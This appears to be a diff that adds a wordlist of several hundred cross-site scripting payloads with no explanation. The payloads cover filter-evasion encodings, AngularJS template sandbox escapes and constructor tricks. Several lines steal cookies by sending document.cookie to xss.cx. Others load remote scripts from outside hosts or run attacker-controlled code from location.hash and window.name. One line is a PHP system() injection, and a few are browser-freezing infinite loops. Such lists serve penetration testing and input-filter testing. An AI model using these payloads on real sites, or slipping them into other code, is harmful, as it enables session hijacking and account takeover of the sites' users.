@@ -1,0 +1,211 @@
+'() {'
+document.createElement('img').src='javascript:while(1){}'
+'<'s'v'g' o'n'l'o'a'd'='a'l'e'r't'('7')' '>'
+(function(a){alert(1)}).call()
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
+p'rompt(1)
+"(prompt(1))in"
+parseInt("prompt",36);
+eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))
+eval(1558153217..toString(36))(1)
+eval(630038579..toString(30))(1)
+eval(0x258da033.toString(30))(1)
+for((i)in(self))eval(i)(1)
+{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
+//prompt.ml%2f@ᄒ.ws/✌
+//prompt.ml%2f@⒕₨
+javascript:prompt(1)#{"action":1}
+vbscript:prompt(1)#{"action":1}
+window.location.assign("http://xss.cx")
+window.name='a\x01b'
+window.name='hacked';location.replace('about:blank');
+window.name="javascript:confirm((window.opener||window).document.cookie);";
+window.open("http://xss.cx","confirm(document.domain);", "", false);
+vbscr&Tab;ipt:confirm(1)"
+vbscript&#00058;confirm(1);
+vbscript:confirm(1);
+{{{}.toString.constructor('confirm(1)')()}}
+try{confirm(document.domain)}catch(e){location.reload()}
+\u003C
+\u003E
+\u003c
+\u003cscript\u003econfirm(\u0027XSS\u0027)\u003c/script\u003e
+\u003e
+\u0061lert(1)
+\u0061\u006c\u0065\u0072\u0074
+\u0061\u006c\u0065\u0072\u0074(1)
+%ufflcxss%2f%uffle
+this["ownerDocu"+"ment"]["loca"+"tion"]=”//google.com”
+throw delete~typeof~confirm(1)/
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html,<script>confirm(0);confirm(1);location.reload();</script>
+.__defineGetter__.constructor('[].constructor.
+defineSetter('x',confirm); x=1;
+delete [a=confirm],delete a(1)
+delete confirm(1)
+delete~[a=confirm]/delete a(1)
+var a=0; ((a == 1) ? 2 : confirm(1));//
+null%22%20style%3d%22background%3aexpression%28confirm%282727%29
+";document.body.addEventListener("DOMActivate",confirm(1))//
+delete~[a=confirm]/delete a(1)
+(0)['constructor']['constructor']("\141\154\145\162\164(1)")();
+ javascript:confirm&lpar1&rpar
+" onfocus="write(unescape('&#60;')+'script src='+unescape('&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;')
+' onmouseover=confirm(document.location)
+(0)['constructor']['constructor']("\141\154\145\162\164(1)")();
+{1+1,confirm(8)}
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver
+({})[$='\143\157\156\163\164\162\165\143\164\157\162'][$]('\141\154\145\162\164\50/ 12345 /\51')()
+1/confirm(1)
+"1\"&confirm(1)\"3"
+>%22%27><img%20src%3d%22javascript:confirm(%27%20XSS%27)%22>'%uff1cscript%uff1econfirm('XSS')%uff1c/script%uff1e'">>"'';!--"<XSS>=&{()}
+\%22}%29%29%29}catch%28e%29{confirm%28document.domain%29;}//
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Exss(0x000045)%3C/script%3E
+\%22;confirm(1);//
+\%22))}catch(e){}if(!self.a)self.a=!confirm(document.cookie)//
+Event.prototype[0]='@garethheyes',Event.prototype.length=1;Event.prototype.toString=[].join;onload=confirm
+ExternalInterface.call("document.write","<script>confirm(1)</script>");
+ExternalInterface.call("eval","myWindow=window.open('','','width=200,height=100'); myWindow.document.write(\"<html><head><script src=\'http://xss.cx/xss.js\'></script></head><body>hi</body></html>\");myWindow.focus()");
+JaVaScRipT:confirm(1)
+String.fromCharCode(0xffff+0x3d)
+(String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41))
+[U+2028]confirm(1)
+'-/"/-confirm(1)//'
++confirm(1)
++confirm(1)--
+-confirm(1)-
+\";confirm(1);//
+“;confirm(1)//
+confirm(1)".replace(/.+/,eval)//
+confirm(1)>>>/xss
+'+confirm(9)&&null=='
+';confirm(String.fromCharCode(88,83,83))//';confirm(String.fromCharCode(88,83,83))//";
+confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//--
+';confirm(String.fromCharCode(88,83,83))//';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//--</SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+';confirm(String.fromCharCode(88,83,83))//\';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//\";confirm(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+\";confirm(document.location);//
+confirm(document.location)
+confirm(document.selection.createRange().getBookmark()) 
+confirm(location.hostname)
+confirm(window.toStaticHTML('<base href="http://xss.cx/"></base>'));  
+confirm(window.toStaticHTML('<label style="overflow:hidden;background:red;display:block;width:4000px;height:4000px;position:absolute;top:0px;left:0px;" for="submit">Click'));  
+confirm(window.toStaticHTML('<marquee>foo</marquee>'));  
+confirm(<xss>xs{[function::status]}s</xss>)
+%c0″//(0000%0dconfirm(1)//
+;\"))}catch(e) {confirm(document.location);}//
+;\\"))}catch(e) {confirm(document.location);}//
+\"));}catch(e){confirm(document.domain);}//
+\"));}catch(e){confirm(document.domain)}//
+\"));}catch(e){x=window.open('http://xss.cx/');setTimeout('confirm(x.document.body.innerText)',4000)}//
+";document.body.addEventListener("DOMActivate",confirm(1))//
+document.body.innerHTML=('<\000\0i\000mg src=xx:x onerror=confirm(1)>') 
+"+document.cookie+"
+document.cookie='xss=xss;domain=.cx.'
+document.getElementsByName("login").item(0).src = http://xss.cx/
+document.location="http://xss.cx/default.aspx?c=" + document.cookie
+'},document.location=window.name+'//'+
+document.location=window.name+'//'+
+document.location=window.name%2b%27//%27%2b
+document.write('<ı onclıck=&#97&#108&#101&#114&#116&#40&#49&#41>asd</ı>'.toUpperCase()
+document.write('<img src="<iframe/onload=confirm(1)>\0">')
+";escape=eval;//
+eval(location.hash.slice(1))
+eval(location.hash.slice(1))//
+");eval(name+"
+"+eval(name)+"
+eval(name)
+eval('\\u'+'0061'+'lert(1)')
+getURL("javascript:confirm(document.location)")
+header('Refresh: 0;url=javascript:confirm(1)');
+htmlStr = '<a href="'+*dataentities*+'javascript:123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { customLog(*dataentities*); } }catch(e){};
+htmlStr = '<a href="javascript'+*dataentities*+'123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { customLog(*dataentities*); } }catch(e){};
+htmlStr = '<a href="javascript'+*dataentities*+':123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { customLog(*dataentities*); } }catch(e){};
+if(1)confirm(1)}{
+javaSCRIPT&colon;confirm(1)
+javas&Tab;cript:\u0061lert(1);
+javascript&#00058;confirm(1)
+javascript&#00058;confirm(1)
+"javascript:confirm(0);",
+;javascript:confirm(0);
+;})javascript:confirm(0);
+javascript:confirm(0);
+javascript:confirm(1)//
+javascript:prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x
+"javascript:prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x"
+/"/_javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x
+javascript:\u0061lert&#x28;1&#x29
+javascript&#x3A;confirm&lpar;document&period;cookie&rpar;
+location='&#118&#98&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41'
+(location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}//<img src="x:x" onerror="if(location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}">
+';location='javascript://'%2Blocation.hash;'
+location='javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c %75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)'
+location='javascript:%61%6c%65%72%74%28%31%29'
+location=javascript:confirm(0);.
+";location=name;//
+\nconfirm(1)
+navigateToURL(new URLRequest("Javascript: document.write(\"<script>confirm(1)</scr\"+\"ipt>\")"),"_self")
+new XMLHttpRequest().open("GET", "data:text/html,<svg onload=confirm(2)></svg>", false);
+;onerror=confirm;throw 1;
+onerror=confirm;throw 1;
+onerror=confirm;throw 1;
+onerror=eval;throw'=confirm\x281\x29';
+onerror=eval;throw'=confirm\x281\x29';
+"onload="a=document.createElement('script');a.setAttribute('src',String.fromCharCode(104,116,116,112,58,47,47,109,97,108,101,114,105,115,99,104,46,110,101,116,47,97,46,106,115));document.body.appendChild(a)
+onload=confirm(1)//
+prompt(0x0064)
+;prompt(1)//”;prompt(2)//”;prompt(3)//–></SCRIPT>”>’><SCRIPT>prompt(4)</SCRIPT>
+"!=prompt(9)!="
+"*prompt(9)*"
+"-prompt(9)-"
+"/prompt(9)/"
+"<<prompt(9)<<"
+"<=prompt(9)<="
+"<prompt(9)<"
+"===prompt(9)==="
+"==prompt(9)=="
+">=prompt(9)>="
+">>>prompt(9)>>>"
+">>prompt(9)>>"
+">prompt(9)>"
+"?prompt(9):"
+"^prompt(9)^"
+"|prompt(9)|"
+"||prompt(9)||"
+prompt(9)
+prompt(location.hash)
+prototype.join=function(){confirm("PWND:"+document.body.innerHTML)}')();
+j&NewLine;a&NewLine;vas&NewLine;cript:confirm(1);
+parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+prompt(1)-eval(JSON.parse(name).input)
+javascript:HTMLDocument.__proto__.__defineSetter__("prototype",function(){try{d.d.d}catch(e){confirm(e.stack)}})
+confirm`1`; var something = `abc${confirm(1)}def`; ``.constructor.constructor`confirm\`1\````;
+'"()=<z>
+'"(){}[];
+JaVAscRIPT:confirm(4)
+[XSS](javascript:confirm(6))
+(javascript:window.onerror=confirm;throw%20document.cookie)
+0\%22))}catch(e){confirm(2)}//
+Components.lookupMethod(self, 'confirm')(1)
+Data URl
+"; ||confirm('XSS') || "
+'';!--"<XSS>=&{()}
+'';!--"<XSS>=&{()}
+5.replace(/XSS/g,confirm)
+";a.b=c;//
+";a[b]=c;//
+a="get";
+$("button").val("<iframe src=vbscript:confirm(1)>")
+external.NavigateAndFind('http://xss.cx',[],[])
+javascript&#09;:alert(1)
+javascript<TAB>:alert(1) 
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call%3b[%22a%22,%22alert(1)%22].sort(toString.constructor)}}
+${@print(system(“dir”))}
+{{m=[({}).constructor.defineProperties];[[''.toString.constructor,{'constructor':{} }].reduce(m[0])];''.toString.constructor('alert(1)')()}}
+Function.prototype.toString=Function.prototype.call;"alert(1)//".replace("//",Function)
+top[630038579..toString(30)](1)
+*/(URL[%26quot;\142\151\147%26quot;][%26quot;\143\157\156\163\164\162\165\143\164\157\162%26quot;](%26quot;\141\154\145\162\164\75\141\154\145\162\164\50\61\51%26quot;)())'%3E%3C%%20style='x:expression/*
+\u{61}l\u{65}rt`1`
+Object.prototype[Symbol.toStringTag]='<svg/onload=alert(1)>';
+while(1){}
+location='javascript:1+{}'
